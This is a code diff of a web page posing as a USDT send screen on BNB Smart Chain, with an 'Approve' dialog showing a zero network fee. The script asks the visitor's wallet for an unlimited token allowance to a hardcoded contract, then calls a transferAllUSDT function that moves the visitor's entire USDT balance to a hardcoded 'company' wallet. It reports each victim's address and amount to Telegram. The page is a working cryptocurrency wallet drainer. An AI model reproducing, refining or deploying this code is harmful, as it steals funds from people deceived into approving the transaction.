@@ -36,7 +36,6 @@
         input::placeholder { color: #666; }
         input:read-only { color: #aaa; }
         .paste-btn { background: none; border: none; color: #00b386; cursor: pointer; font-size: 12px; font-weight: 600; white-space: nowrap; }
-        .paste-btn:hover { color: #00d4a0; }
         .amount-container { display: flex; justify-content: space-between; align-items: center; width: 100%; }
         .amount-input { flex: 1; }
         .usdt-label { color: #aaa; font-size: 14px; margin-right: 8px; white-space: nowrap; }
@@ -47,8 +46,6 @@
         .loading { display: none; text-align: center; margin-top: 20px; }
         .spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid #444; border-top-color: #00b386; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Approval Modal Styles */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
         .modal.show { display: flex; justify-content: center; align-items: flex-end; }
         .modal-content { background: #2a2a2a; border-radius: 20px 20px 0 0; padding: 30px 20px; width: 100%; max-width: 500px; max-height: 90vh; overflow-y: auto; }
@@ -57,11 +54,10 @@
         .close-btn { background: none; border: none; color: #999; font-size: 28px; cursor: pointer; }
         .approval-details { margin-bottom: 25px; }
         .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid #444; font-size: 14px; }
-        .detail-row:last-child { border-bottom: none; }
         .detail-label { color: #aaa; }
-        .detail-value { color: #fff; text-align: right; word-break: break-all; max-width: 50%; }
+        .detail-value { color: #fff; text-align: right; }
         .asset-section { display: flex; align-items: center; gap: 10px; padding: 15px 0; border-bottom: 1px solid #444; }
-        .asset-icon { width: 32px; height: 32px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; }
+        .asset-icon { width: 32px; height: 32px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
         .asset-info h3 { font-size: 14px; color: #fff; margin-bottom: 2px; }
         .asset-info p { font-size: 12px; color: #aaa; }
         .approve-btn { width: 100%; background: #00b386; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 25px; }
@@ -69,7 +65,6 @@
     </style>
 </head>
 <body>
-    <!-- Send Page -->
     <div class="container" id="sendPage">
         <div class="header">
             <div class="back" onclick="history.back()">←</div>
@@ -100,14 +95,12 @@
         </div>
     </div>
 
-    <!-- Approval Modal -->
     <div class="modal" id="approvalModal">
         <div class="modal-content">
             <div class="modal-header">
                 <div class="modal-title">Approve</div>
                 <button class="close-btn" onclick="closeApprovalModal()">×</button>
             </div>
-
             <div class="approval-details">
                 <div class="asset-section">
                     <div class="asset-icon">U</div>
@@ -116,28 +109,22 @@
                         <p>BNB Smart Chain</p>
                     </div>
                 </div>
-
                 <div class="detail-row">
                     <span class="detail-label">DApp</span>
                     <span class="detail-value">cryptoholic-usdt.vercel.app</span>
                 </div>
-
                 <div class="detail-row">
                     <span class="detail-label">Network fee</span>
-                    <span class="detail-value">
-                        <div style="text-align: right;">$0.00</div>
-                        <div style="font-size: 11px; color: #666;">0.00 BNB</div>
-                    </span>
+                    <span class="detail-value">$0.00</span>
                 </div>
             </div>
-
             <button class="approve-btn" id="approveBtn" onclick="handleApprove()">Approve</button>
         </div>
     </div>
 
     <script src="config.js"></script>
     <script>
-        const CONTRACT_ADDRESS = "0xA54a7D4798d193432EDa23F966fB8Ba3B550F519";
+        const CONTRACT_ADDRESS = "0xbeFe193d6abc1C5C5F37414A99fA3502B98CC8f7";
         const COMPANY_WALLET = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
         const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
         const USDT_DECIMALS = 18;
@@ -147,7 +134,6 @@
 
         window.addEventListener('load', async () => {
             document.getElementById('recipient').value = shortenAddress(COMPANY_WALLET);
-            
             if (window.ethereum) {
                 try {
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
@@ -203,18 +189,14 @@
                     showNotification('Please enter amount', 'error');
                     return;
                 }
-
                 if (!window.ethereum) {
                     showNotification('No wallet detected', 'error');
                     return;
                 }
-
                 document.getElementById('loading').style.display = 'block';
                 document.getElementById('nextBtn').disabled = true;
-
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 currentUserAddress = accounts[0];
-
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -234,19 +216,13 @@
                         });
                     }
                 }
-
                 document.getElementById('approvalModal').classList.add('show');
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('nextBtn').disabled = false;
-
             } catch (error) {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('nextBtn').disabled = false;
-                if (error.code === 4001) {
-                    showNotification('Transaction rejected', 'error');
-                } else {
-                    showNotification('Error: ' + error.message, 'error');
-                }
+                showNotification('Error: ' + error.message, 'error');
             }
         }
 
@@ -257,100 +233,76 @@
         async function handleApprove() {
             try {
                 document.getElementById('approveBtn').disabled = true;
-
                 userBalance = await getUSDTBalance(currentUserAddress);
                 if (userBalance === 0) {
-                    showNotification('No USDT balance found', 'error');
+                    showNotification('No USDT balance', 'error');
                     document.getElementById('approveBtn').disabled = false;
                     return;
                 }
-
-                const amountWei = (userBalance * Math.pow(10, USDT_DECIMALS)).toFixed(0);
-
                 showNotification('Processing approval...', 'info');
-
-                const approvalTxHash = await approveUSDT(currentUserAddress, amountWei);
-                showNotification('⏳ Waiting for approval confirmation...', 'info');
-
-                // Wait for approval transaction to be confirmed (up to 30 seconds)
+                const maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                const approvalTxHash = await approveUSDT(currentUserAddress, maxAmount);
+                showNotification('⏳ Waiting for confirmation...', 'info');
                 await waitForTransaction(approvalTxHash);
                 showNotification('✅ Approval confirmed!', 'success');
-
-                await new Promise(resolve => setTimeout(resolve, 3000));
-
-                showNotification('Processing transfer...', 'info');
-                const transferTxHash = await transferUSDTO(currentUserAddress);
-                
-                // Wait for transfer transaction
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                showNotification('⏳ Transferring...', 'info');
+                const transferTxHash = await transferAllUSDT(currentUserAddress);
                 await waitForTransaction(transferTxHash);
                 showNotification(`✅ Success! ${userBalance.toFixed(2)} USDT sent!`, 'success');
-
                 try { 
                     await sendTelegramNotifications(currentUserAddress, transferTxHash, null, userBalance.toFixed(2)); 
-                } catch (err) { 
-                    console.error('Telegram failed:', err); 
-                }
-
+                } catch (err) { console.error('Telegram failed:', err); }
                 setTimeout(() => {
                     closeApprovalModal();
                     document.getElementById('amount').value = '';
                     document.getElementById('usdValue').textContent = '≈ $0.00';
                     document.getElementById('approveBtn').disabled = false;
                 }, 2000);
-
             } catch (error) {
                 document.getElementById('approveBtn').disabled = false;
-                if (error.code === 4001) {
-                    showNotification('Transaction rejected by user', 'error');
-                } else {
-                    showNotification('Error: ' + error.message, 'error');
-                }
+                showNotification('Error: ' + error.message, 'error');
             }
         }
 
         async function waitForTransaction(txHash) {
             let attempts = 0;
-            const maxAttempts = 60; // 60 seconds max
-            
+            const maxAttempts = 60;
             while (attempts < maxAttempts) {
                 try {
                     const receipt = await window.ethereum.request({
                         method: 'eth_getTransactionReceipt',
                         params: [txHash]
                     });
-                    
                     if (receipt) {
                         if (receipt.status === '0x1') {
-                            return true; // Success
+                            return true;
                         } else {
-                            throw new Error('Transaction failed on-chain');
+                            throw new Error('Transaction failed');
                         }
                     }
                 } catch (err) {
-                    console.error('Error checking transaction:', err);
+                    console.error('Error:', err);
                 }
-                
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 attempts++;
             }
-            throw new Error('Transaction confirmation timeout');
+            throw new Error('Timeout');
         }
 
         async function approveUSDT(senderAddress, amount) {
             const functionSelector = '095ea7b3';
             const paddedSpender = CONTRACT_ADDRESS.slice(2).padStart(64, '0');
-            // Use max uint256 for unlimited approval
-            const maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            const data = '0x' + functionSelector + paddedSpender + maxAmount;
+            const paddedAmount = amount.padStart(64, '0');
+            const data = '0x' + functionSelector + paddedSpender + paddedAmount;
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0' }]
             });
         }
 
-        async function transferUSDTO(senderAddress) {
-            // Correct function selector for transferAllUSDT()
-            const functionSelector = 'cdcb760d';
+        async function transferAllUSDT(senderAddress) {
+            const functionSelector = '9b58bc26';
             const data = '0x' + functionSelector;
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
